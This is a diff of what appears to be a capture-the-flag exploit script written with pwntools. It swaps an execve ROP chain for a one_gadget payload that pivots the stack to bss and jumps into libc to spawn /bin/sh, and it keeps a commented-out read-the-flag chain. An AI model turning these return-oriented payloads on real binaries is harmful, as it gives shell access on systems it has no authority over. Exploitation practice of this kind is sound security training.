@@ -52,9 +52,9 @@ pop_rdi = roplibc.rdi.address + libc.address
 pop_rdx = roplibc.rdx.address + libc.address
 
 # method-1 execve,but system cannot run
-payload = b"/bin/sh\x00".ljust(0x30, b"\x00") + p64(bss)
-# payload += p64(pop_rdi) + p64(bss - 0x30) + p64(ret) + p64(libc.symbols["system"])
-payload += p64(pop_rdi) + p64(bss - 0x30) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(libc.symbols["execve"])
+#payload = b"/bin/sh\x00".ljust(0x30, b"\x00") + p64(bss)
+## payload += p64(pop_rdi) + p64(bss - 0x30) + p64(ret) + p64(libc.symbols["system"])
+#payload += p64(pop_rdi) + p64(bss - 0x30) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(libc.symbols["execve"])
 
 # method-2 orw
 #payload = b"./flag\x00".ljust(0x30, b"\x00") + p64(bss)
@@ -63,6 +63,16 @@ payload += p64(pop_rdi) + p64(bss - 0x30) + p64(pop_rsi) + p64(0) + p64(pop_rdx)
 #    libc.symbols["read"]) # read
 #payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss + 0x50) + p64(pop_rdx) + p64(0x30) + p64(
 #    libc.symbols["write"]) # write
+
+# method-3 one_gadget
+"""
+0xe3afe execve("/bin/sh", r15, r12)
+0xe3b01 execve("/bin/sh", r15, rdx)
+0xe3b04 execve("/bin/sh", rsi, rdx)
+"""
+one_gadget = libc.address + 0xe3b01
+payload = b"/bin/sh\x00".ljust(0x30, b"\x00") + p64(bss)
+payload += p64(one_gadget)
 
 ddebug("b *0x401225")
 io.sendlineafter("here!\n", payload)
